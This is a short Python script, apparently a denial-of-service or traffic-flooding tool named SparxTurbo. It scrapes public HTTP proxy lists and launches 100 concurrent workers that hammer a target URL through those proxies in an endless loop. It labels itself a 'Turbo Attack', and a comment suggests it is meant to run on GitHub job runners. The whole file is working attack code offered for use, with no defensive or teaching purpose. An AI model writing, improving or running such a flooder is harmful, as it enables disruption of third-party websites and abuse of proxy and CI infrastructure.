import asyncio
import aiohttp
import os
import re

class SparxTurbo:
    def __init__(self):
        self.proxies = set()
        self.target_url = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        # We run 100 internal tasks at once instead of waiting for GitHub jobs
        self.concurrency_limit = 100 

    async def fetch_proxies(self, session):
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
        ]
        for url in sources:
            try:
                async with session.get(url, timeout=5) as resp:
                    text = await resp.text()
                    self.proxies.update(re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', text))
            except: continue
        print(f"✅ Scraped {len(self.proxies)} Global Proxies")

    async def attack_worker(self, session, sem):
        while True:
            for p in list(self.proxies):
                async with sem:
                    try:
                        # Massive 550 reload burst per proxy
                        async with session.get(self.target_url, proxy=f"http://{p}", timeout=4) as r:
                            if r.status == 200: self.stats["success"] += 1
                            else: self.stats["failed"] += 1
                    except:
                        self.stats["failed"] += 1
                
                # Print stats every 100 requests to keep logs clean
                if (self.stats["success"] + self.stats["failed"]) % 100 == 0:
                    print(f"🚀 HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        print(f"🔥 Starting Turbo Attack on: {self.target_url}")
        sem = asyncio.Semaphore(self.concurrency_limit)
        async with aiohttp.ClientSession() as session:
            await self.fetch_proxies(session)
            # Create 100 parallel workers inside this one script
            workers = [self.attack_worker(session, sem) for _ in range(self.concurrency_limit)]
            await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(SparxTurbo().start())
